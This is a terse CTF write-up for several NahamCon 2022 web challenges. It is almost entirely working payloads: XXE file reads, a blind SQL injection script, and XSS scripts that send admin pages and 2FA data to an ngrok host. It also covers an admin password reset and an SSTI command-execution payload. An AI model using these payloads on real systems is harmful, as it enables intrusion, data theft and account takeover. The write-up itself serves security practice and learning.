# Jurassic Park
## Content Discovery
- robots.txt --> leak ``/ingen/flag.txt``
# EXtravagant
## XXE Injection
```
<?xml version="1.0"?>
<!DOCTYPE root [<!ENTITY test SYSTEM 'file:///var/www/flag.txt'>]>
<root>&test;</root>
```
# Personnel
[src](Writeup/NahamCon-CTF-2022/src/app.py)
## Regex bypass
```
curl -X POST -H "Content-Type: application/x-www-form-urlencoded" --data "setting=2&name=.*" http://challenge.nahamcon.com:30349/
```
# Flaskmental Alchemist
## CVE-2019-7164: SQLALchemy (order_by) aka Blind SQLi 
[src](Writeup/NahamCon-CTF-2022/src/fma.zip)
```
#!python3
from curses import keyname
import requests,string
payload=string.printable
url= "http://challenge.nahamcon.com:31445/"
h={
    "Content-Type": "application/x-www-form-urlencoded"
}
flag=''
i=1
while True:
    for key in range(33,127):
        data={
            "search":"a",
            "order":f"(CASE WHEN (SELECT SUBSTR(flag,{i},1) FROM flag)=CHAR({key}) THEN symbol ELSE atomic_number END) DESC "
        }
        r=requests.post(url,headers=h,data=data)
        if int(r.text.index('23')) < int(r.text.index('110')):
            flag+=chr(key)
            print(f"[+] Found Char: {flag}")
            i+=1
            break
        else:
            print(f"[-] Trying {chr(key)}")
```
# Hacker Ts
## XSS
```
<script src="http://a739-2402-800-61b1-c507-f1b3-14c7-7e32-85eb.ngrok.io/exploit.js"></script>
```

``exploit.js``:
```
var r1 = new XMLHttpRequest();
r1.open('GET', "http://localhost:5000/admin", false);
r1.send()
var flag = r1.responseText;
var r2 = new XMLHttpRequest();
r2.open('GET', 'http://a739-2402-800-61b1-c507-f1b3-14c7-7e32-85eb.ngrok.io/?flag=' + encodeURI(btoa(flag)), true);
r2.send()
```
# Two For One
## XSS & Bypass 2FA
- Leak OTP code from admin -> generate QR with ``qr`` command (``pip3 install qrcode``)

``get_2fa.js``:
```
var r = new XMLHttpRequest();
r.open("POST", "http://challenge.nahamcon.com:32284/reset2fa");
r.withCredentials = true;
r.onload = () => {
    var r2 = new XMLHttpRequest;
    r2.open("GET", "http://0e0b-2402-800-61b1-c507-f1b3-14c7-7e32-85eb.ngrok.io/?flag=" + btoa(r.responseText));
    r2.send()
};
r.send();
```
- Reset admin password
```
var r = new XMLHttpRequest;
data = JSON.stringify({
    'password': '123',
    'password2': '123',
    'otp': '559483',
});
r.open("POST", "http://challenge.nahamcon.com:32284/reset_password", true)
r.onload = () => {
    var r2 = new XMLHttpRequest;
    r2.open("GET", "http://0e0b-2402-800-61b1-c507-f1b3-14c7-7e32-85eb.ngrok.io/?flag=" + btoa(r.responseText));
    r2.send();
};
r.setRequestHeader('Content-type', 'application/json');
r.send(data);
```
- login with that cred and get to get the flag
  
# Defcon
## SSTI (Bypass Bracket and RFC5322-compliant)
https://appcheck-ng.com/wp-content/uploads/unicode_normalization.html

Payload:
```
name=qquang&email={{joiner.__init__.__globals__.os.popen⁽'cat${IFS}*'⁾.read⁽⁾}}@gmail.com
```

# Poller (Not solve)
Read [here](../../Note/django_picker_serialize.md)